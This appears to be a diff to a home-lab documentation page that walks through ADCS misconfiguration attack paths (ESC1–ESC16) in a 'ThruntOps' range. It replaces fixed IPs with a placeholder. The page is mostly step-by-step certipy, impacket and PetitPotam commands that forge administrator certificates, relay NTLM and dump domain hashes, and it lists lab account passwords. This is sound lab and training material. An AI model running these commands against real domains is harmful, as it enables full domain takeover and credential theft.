@@ -5,7 +5,7 @@ nav_order: 9
 ---
 
 {: .warning }
-**Fase 2 — not yet deployed.** The ADCS VM and ESC attack paths are planned for Fase 2. This documentation is preserved as implementation and testing reference.
+**Fase 2 — prepared, not yet validated.** `ranges/elastic-adcs.yml` adds the ADCS VM and ESC attack-path prerequisites to the validated Elastic core profile. This documentation is preserved as implementation and testing reference until the ADCS range is deployed and tested end to end.
 
 # ADCS Attack Paths
 {: .no_toc }
@@ -28,17 +28,17 @@ Enterprise Security Configurations (ESC) implemented in the ThruntOps lab via `b
 | Component | Value |
 |---|---|
 | **CA name** | `thruntops-CA` |
-| **CA host** | ADCS — 10.2.50.13 |
-| **Web Enrollment** | `http://10.2.50.13/certsrv/certfnsh.asp` |
+| **CA host** | ADCS — `<range_ip>.20.13` |
+| **Web Enrollment** | `http://<range_ip>.20.13/certsrv/certfnsh.asp` |
 | **Domain** | `thruntops.domain` |
-| **DC** | DC01-2022 — 10.2.50.11 |
-| **Attacker** | Kali — 10.2.50.250 |
+| **DC** | DC01-2022 — `<range_ip>.20.11` |
+| **Attacker** | Kali — `<range_ip>.20.250` |
 
 ### Entry points
 
 | Account | Password | Notes |
 |---|---|---|
-| `domainuser` | `NV#8SL9#` | Any domain user — valid for ESC1, 2, 3, 6, 8, 11 |
+| `domainuser` | `password` | Any domain user — valid for ESC1, 2, 3, 6, 8, 11 |
 | `primary_user04` | `ggA15$y!` | RDP on ADCS — useful for ESC5 local access |
 | `esc5user` | `ESC5password` | Domain Admin (ESC5 specific user) |
 | `esc7_camgr_user` | `ESC7password` | CA Manager role (ESC7) |
@@ -61,13 +61,13 @@ pip install certipy-ad
 
 ```bash
 # Full enumeration — finds all vulnerable templates and CA misconfigs
-certipy find -u domainuser@thruntops.domain -p 'NV#8SL9#' -dc-ip 10.2.50.11 -stdout
+certipy find -u domainuser@thruntops.domain -p 'password' -dc-ip <range_ip>.20.11 -stdout
 
 # Output to files (JSON + text)
-certipy find -u domainuser@thruntops.domain -p 'NV#8SL9#' -dc-ip 10.2.50.11
+certipy find -u domainuser@thruntops.domain -p 'password' -dc-ip <range_ip>.20.11
 
 # BloodHound-compatible output
-certipy find -u domainuser@thruntops.domain -p 'NV#8SL9#' -dc-ip 10.2.50.11 -bloodhound
+certipy find -u domainuser@thruntops.domain -p 'password' -dc-ip <range_ip>.20.11 -bloodhound
 ```
 
 ---
@@ -78,11 +78,11 @@ After obtaining a `.pfx` certificate for a privileged account:
 
 ```bash
 # Authenticate and retrieve NT hash
-certipy auth -pfx administrator.pfx -domain thruntops.domain -dc-ip 10.2.50.11
+certipy auth -pfx administrator.pfx -domain thruntops.domain -dc-ip <range_ip>.20.11
 
 # Use hash for lateral movement
-impacket-psexec -hashes :NTHASH administrator@10.2.50.11
-impacket-secretsdump -hashes :NTHASH administrator@10.2.50.11
+impacket-psexec -hashes :NTHASH administrator@<range_ip>.20.11
+impacket-secretsdump -hashes :NTHASH administrator@<range_ip>.20.11
 ```
 
 ---
@@ -96,8 +96,8 @@ impacket-secretsdump -hashes :NTHASH administrator@10.2.50.11
 # Request certificate as administrator using ESC1 template
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template ESC1 \
   -upn administrator@thruntops.domain
@@ -124,16 +124,16 @@ Any domain user
 # Step 1: Obtain Enrollment Agent certificate
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template ESC2
 
 # Step 2: Use EA cert to enroll as administrator on a different template
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template User \
   -on-behalf-of 'thruntops\administrator' \
@@ -160,16 +160,16 @@ Any domain user
 # Step 1: Request Enrollment Agent cert from ESC3 template
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template ESC3
 
 # Step 2: Use EA cert to request ESC3_CRA certificate on behalf of administrator
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template ESC3_CRA \
   -on-behalf-of 'thruntops\administrator' \
@@ -187,16 +187,16 @@ certipy req \
 # Step 1: Overwrite template to add ENROLLEE_SUPPLIES_SUBJECT (saves backup as ESC4.json)
 certipy template \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -template ESC4 \
   -save-old
 
 # Step 2: Request certificate as administrator
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template ESC4 \
   -upn administrator@thruntops.domain
@@ -204,8 +204,8 @@ certipy req \
 # Step 3: Restore template (clean up)
 certipy template \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -template ESC4 \
   -configuration ESC4.json
 ```
@@ -221,10 +221,10 @@ certipy template \
 # Use esc5user to manage the CA via DCOM
 
 # From Kali: shell as esc5user
-impacket-psexec esc5user:ESC5password@10.2.50.13
+impacket-psexec esc5user:ESC5password@<range_ip>.20.13
 
 # From inside: add ManageCA permission for lower-priv account
-certutil -config "10.2.50.13\thruntops-CA" -setcaproperty manageca domainuser
+certutil -config "<range_ip>.20.13\thruntops-CA" -setcaproperty manageca domainuser
 ```
 
 **Attack path:**
@@ -246,8 +246,8 @@ Compromise esc5user (ESC5password)
 # Request a standard User template certificate with arbitrary UPN
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template User \
   -upn administrator@thruntops.domain
@@ -271,15 +271,15 @@ ESC6 is the most permissive misconfiguration — it affects every Client Authent
 certipy ca \
   -u esc7_camgr_user@thruntops.domain \
   -p 'ESC7password' \
-  -dc-ip 10.2.50.11 \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -enable-template SubCA
 
 # Step 2: Request SubCA cert with arbitrary SAN (request will be pending)
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template SubCA \
   -upn administrator@thruntops.domain
@@ -288,15 +288,15 @@ certipy req \
 certipy ca \
   -u esc7_camgr_user@thruntops.domain \
   -p 'ESC7password' \
-  -dc-ip 10.2.50.11 \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -issue-request <REQUEST_ID>
 
 # Step 4: Retrieve the issued certificate
 certipy req \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -retrieve <REQUEST_ID>
 ```
@@ -305,12 +305,12 @@ certipy req \
 
 ## ESC8 — NTLM Relay to AD CS Web Enrollment
 
-**Condition:** Web Enrollment (`/certsrv/`) is enabled on ADCS (10.2.50.13). An NTLM relay attack (via PetitPotam) redirects the DC machine account's authentication to the Web Enrollment endpoint — issuing a certificate for the DC.
+**Condition:** Web Enrollment (`/certsrv/`) is enabled on ADCS (<range_ip>.20.13). An NTLM relay attack (via PetitPotam) redirects the DC machine account's authentication to the Web Enrollment endpoint — issuing a certificate for the DC.
 
 ```bash
 # Step 1: Start NTLM relay targeting ADCS Web Enrollment
 impacket-ntlmrelayx \
-  -t http://10.2.50.13/certsrv/certfnsh.asp \
+  -t http://<range_ip>.20.13/certsrv/certfnsh.asp \
   -smb2support \
   --adcs \
   --template DomainController
@@ -318,8 +318,8 @@ impacket-ntlmrelayx \
 # Step 2: Trigger DC authentication to Kali using PetitPotam (unauthenticated)
 python3 PetitPotam.py \
   -u '' -p '' \
-  10.2.50.250 \
-  10.2.50.11
+  <range_ip>.20.250 \
+  <range_ip>.20.11
 
 # Result: ntlmrelayx captures DC$ certificate (base64 in output)
 
@@ -327,7 +327,7 @@ python3 PetitPotam.py \
 echo '<BASE64_CERT>' | base64 -d > dc01.pfx
 certipy auth \
   -pfx dc01.pfx \
-  -dc-ip 10.2.50.11 \
+  -dc-ip <range_ip>.20.11 \
   -domain thruntops.domain
 ```
 
@@ -335,7 +335,7 @@ certipy auth \
 
 ```
 PetitPotam → DC01-2022$ authenticates to Kali (NTLM)
-  → ntlmrelayx relays to http://10.2.50.13/certsrv/
+  → ntlmrelayx relays to http://<range_ip>.20.13/certsrv/
   → Certificate issued for DC01-2022$
   → certipy auth → NT hash for DC01-2022$
   → DCSync → all domain hashes
@@ -353,8 +353,8 @@ PetitPotam → DC01-2022$ authenticates to Kali (NTLM)
 # (requires GenericWrite on esc9user — granted to Domain Users by the role)
 certipy account update \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -user esc9user \
   -upn administrator@thruntops.domain
 
@@ -362,15 +362,15 @@ certipy account update \
 certipy req \
   -u esc9user@thruntops.domain \
   -p 'ESC9password' \
-  -dc-ip 10.2.50.11 \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template ESC9
 
 # Step 3: Restore esc9user UPN
 certipy account update \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -user esc9user \
   -upn esc9user@thruntops.domain
 
@@ -378,7 +378,7 @@ certipy account update \
 certipy auth \
   -pfx esc9user.pfx \
   -domain thruntops.domain \
-  -dc-ip 10.2.50.11
+  -dc-ip <range_ip>.20.11
 ```
 
 ---
@@ -390,7 +390,7 @@ certipy auth \
 ```bash
 # Step 1: Start RPC relay to CA
 impacket-ntlmrelayx \
-  -t rpc://10.2.50.13 \
+  -t rpc://<range_ip>.20.13 \
   -rpc-mode ICPR \
   -icpr-ca-name thruntops-CA \
   -smb2support \
@@ -398,7 +398,7 @@ impacket-ntlmrelayx \
   --template DomainController
 
 # Step 2: Trigger DC authentication
-python3 PetitPotam.py -u '' -p '' 10.2.50.250 10.2.50.11
+python3 PetitPotam.py -u '' -p '' <range_ip>.20.250 <range_ip>.20.11
 ```
 
 {: .note }
@@ -416,7 +416,7 @@ ESC11 is the RPC equivalent of ESC8 — bypasses the requirement for Web Enrollm
 certipy req \
   -u esc13user@thruntops.domain \
   -p 'ESC13password' \
-  -dc-ip 10.2.50.11 \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template ESC13
 
@@ -424,7 +424,7 @@ certipy req \
 certipy auth \
   -pfx esc13user.pfx \
   -domain thruntops.domain \
-  -dc-ip 10.2.50.11
+  -dc-ip <range_ip>.20.11
 ```
 
 **Concept:** The obtained certificate carries the issuance policy OID which, during PKINIT, triggers automatic universal group membership in `esc13group` — granting whatever rights that group has in the domain.
@@ -438,8 +438,8 @@ certipy auth \
 ```bash
 certipy find \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -stdout \
   -enabled
 # Look for templates marked as vulnerable to ESC15
@@ -457,29 +457,29 @@ certipy find \
 
 certipy account update \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -user esc16user \
   -upn administrator@thruntops.domain
 
 certipy req \
   -u esc16user@thruntops.domain \
   -p 'ESC16password' \
-  -dc-ip 10.2.50.11 \
+  -dc-ip <range_ip>.20.11 \
   -ca thruntops-CA \
   -template User
 
 certipy account update \
   -u domainuser@thruntops.domain \
-  -p 'NV#8SL9#' \
-  -dc-ip 10.2.50.11 \
+  -p 'password' \
+  -dc-ip <range_ip>.20.11 \
   -user esc16user \
   -upn esc16user@thruntops.domain
 
 certipy auth \
   -pfx esc16user.pfx \
   -domain thruntops.domain \
-  -dc-ip 10.2.50.11
+  -dc-ip <range_ip>.20.11
 ```
 
 ---
